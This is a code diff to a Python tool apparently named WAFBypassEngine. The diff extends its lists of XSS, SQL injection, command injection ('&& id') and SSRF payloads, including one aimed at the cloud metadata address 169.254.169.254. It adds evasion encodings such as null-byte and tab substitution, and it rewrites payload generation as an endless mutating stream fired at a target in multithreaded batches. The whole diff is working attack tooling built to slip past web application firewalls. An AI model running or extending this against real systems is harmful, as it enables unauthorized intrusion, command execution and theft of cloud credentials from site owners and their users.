@@ -15,14 +15,15 @@ class PayloadMutator:
         'DOUBLE_URL': lambda x: requests.utils.quote(requests.utils.quote(x)),
         'UNICODE': lambda x: ''.join(f'%u{ord(c):04x}' for c in x),
         'HEX': lambda x: ''.join(f'%{ord(c):02x}' for c in x),
+        'SPACE_TAB': lambda x: x.replace(' ', '\t'),
+        'SPACE_NULL': lambda x: x.replace(' ', '\x00'),
     }
     
     @staticmethod
-    def mutate_payload(payload: str, technique: str = None) -> str:
-        if not technique or technique not in PayloadMutator.BYPASS_TECHNIQUES:
-            return payload
+    def mutate_payload(payload: str) -> str:
+        technique = random.choice(list(PayloadMutator.BYPASS_TECHNIQUES.values()))
         try:
-            return PayloadMutator.BYPASS_TECHNIQUES[technique](payload)
+            return technique(payload)
         except:
             return payload
 
@@ -35,6 +36,9 @@ class IntelligentPayloadGenerator:
         '<svg onload=alert(1)>',
         '<iframe onload=alert(1)>',
         '<body onload=alert(1)>',
+        '<input onfocus=alert(1) autofocus>',
+        '<details open ontoggle=alert(1)>',
+        '<video src=x onerror=alert(1)>',
     ]
     
     SQLI_VECTORS = [
@@ -42,6 +46,7 @@ class IntelligentPayloadGenerator:
         "' OR 1=1--",
         "1' AND '1'='1",
         "admin' --",
+        "' or 1=1 /*",
     ]
     
     RCE_VECTORS = [
@@ -49,16 +54,18 @@ class IntelligentPayloadGenerator:
         '$(id)',
         '| id',
         '; id;',
+        '&& id',
     ]
     
     SSRF_VECTORS = [
         'http://127.0.0.1:8080',
         'http://localhost:3000',
         'file:///etc/passwd',
+        'http://169.254.169.254/latest/meta-data/',
     ]
     
     @staticmethod
-    def generate_intelligent_payloads(vector_type: str, unlimited: bool = True) -> List[str]:
+    def generate_smart_payloads(vector_type: str):
         vector_map = {
             'XSS': IntelligentPayloadGenerator.XSS_VECTORS,
             'SQLI': IntelligentPayloadGenerator.SQLI_VECTORS,
@@ -68,16 +75,20 @@ class IntelligentPayloadGenerator:
         }
         
         base_vectors = vector_map.get(vector_type.upper(), IntelligentPayloadGenerator.XSS_VECTORS)
-        payloads = list(base_vectors)
         
-        count = 200 if unlimited else 50
-        for _ in range(count):
-            vector = random.choice(base_vectors)
-            technique = random.choice(list(PayloadMutator.BYPASS_TECHNIQUES.keys()))
-            mutated = PayloadMutator.mutate_payload(vector, technique)
-            payloads.append(mutated)
-        
-        return list(set(payloads))[:300]
+        while True:
+            base = random.choice(base_vectors)
+            yield base
+            
+            for _ in range(5):
+                mutated = PayloadMutator.mutate_payload(base)
+                yield mutated
+                
+            for _ in range(3):
+                combo = random.choice(base_vectors)
+                for _ in range(random.randint(1, 3)):
+                    combo = PayloadMutator.mutate_payload(combo)
+                yield combo
 
 
 class WAFDetector:
@@ -202,24 +213,33 @@ class WAFBypassEngine:
         self.get_baseline_response()
         
         successful = []
+        payload_generator = IntelligentPayloadGenerator.generate_smart_payloads(vector_type)
+        
+        batch_size = 100
         
         while not self.should_stop:
-            payloads = IntelligentPayloadGenerator.generate_intelligent_payloads(
-                vector_type,
-                unlimited=True
-            )
+            payloads_batch = []
+            
+            for _ in range(batch_size):
+                if self.should_stop:
+                    break
+                try:
+                    payload = next(payload_generator)
+                    if payload not in self.payload_cache:
+                        self.payload_cache.add(payload)
+                        payloads_batch.append(payload)
+                except StopIteration:
+                    break
+            
+            if not payloads_batch:
+                continue
             
             with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
                 futures = []
                 
-                for payload in payloads:
+                for payload in payloads_batch:
                     if self.should_stop:
                         break
-                    
-                    if payload in self.payload_cache:
-                        continue
-                    
-                    self.payload_cache.add(payload)
                     
                     future = executor.submit(self.test_payload_fast, payload, 'query')
                     futures.append(future)
